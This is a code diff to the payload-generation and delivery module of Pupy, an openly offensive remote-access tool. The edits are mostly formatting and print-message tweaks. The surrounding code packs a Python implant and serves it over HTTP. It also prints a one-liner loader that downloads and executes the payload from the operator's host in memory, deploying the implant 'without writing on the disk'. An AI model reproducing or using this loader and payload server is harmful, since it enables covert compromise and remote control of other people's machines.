@@ -3,7 +3,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import re
 import os.path
 
@@ -12,16 +12,17 @@ from pupylib.utils.term import colorize
 from pupylib.payloads import dependencies
 from pupylib import ROOT
 
+
 def getLinuxImportedModules():
     '''
     '''
     lines = ""
-    with open(os.path.join(ROOT,"conf","imports_done.py")) as f:
-        lines=f.read()
+    with open(os.path.join(ROOT, "conf", "imports_done.py")) as f:
+        lines = f.read()
     return lines
 
 def pack_py_payload(conf, debug=False):
-    print colorize('[+] ','green')+'generating PY payload ...'
+    print colorize('[+] ','green') + 'generating PY payload ...'
     fullpayload = []
 
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
@@ -40,7 +41,7 @@ def pack_py_payload(conf, debug=False):
         ]) + '\n'
     )
 
-    with open(os.path.join(ROOT,'pp.py')) as f:
+    with open(os.path.join(ROOT, 'pp.py')) as f:
         code = f.read()
 
     code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
@@ -66,7 +67,7 @@ def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
     class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
-            self.send_header('Content-type','text/html')
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
             # Send the html message
             self.wfile.write(payload)
@@ -82,16 +83,18 @@ def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
                     port+=1
                 else:
                     raise
-        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
+        print colorize("[+] ","green") + "copy/paste this one-line loader to deploy pupy without writing on the disk :"
         print " --- "
-        oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
+        oneliner = colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
         print oneliner
         print " --- "
-
-        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
-        print colorize("[+] ","green")+'waiting for a connection ...'
+        
+        print colorize("[+] ","green") + 'HTTP server started on {ip}:{port}'.format(ip=ip, port=port)
+        print colorize("[+] ","green") + 'CTCL+C to kill the server'
+        print colorize("[+] ","green") + 'Waiting for a connection ...'
         server.serve_forever()
+    
     except KeyboardInterrupt:
-        print 'KeyboardInterrupt received, shutting down the web server'
+        print colorize("[+] ","red") + 'KeyboardInterrupt received, shutting down the web server'
         server.socket.close()
-        exit()
+        server.shutdown()
